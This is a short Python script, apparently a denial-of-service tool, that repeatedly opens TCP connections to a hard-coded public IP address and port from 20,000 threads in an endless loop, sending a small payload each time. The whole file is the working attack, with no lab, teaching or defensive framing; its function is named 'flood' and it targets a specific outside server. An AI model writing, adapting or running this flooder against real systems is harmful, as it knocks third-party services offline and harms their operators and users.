import socket
import socket
from concurrent.futures import ThreadPoolExecutor as Executor


TARGET_IP = "185.236.211.147"
TARGET_PORT = 1443


def flood():
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.settimeout(5)
  s.connect((TARGET_IP, TARGET_PORT))
  s.sendall(b"Hello, server!")
 except socket.error as e:
  print(f"Socket error: {e}")
 except Exception as e:
  print(f"Unexpected error: {e}")


def main():
 num_threads = 20000

 while True:
  with Executor(max_workers=num_threads) as executor:
   futures = [executor.submit(flood) for _ in range(num_threads)]
   for future in futures:
    future.result()


if __name__ == '__main__':
 main()
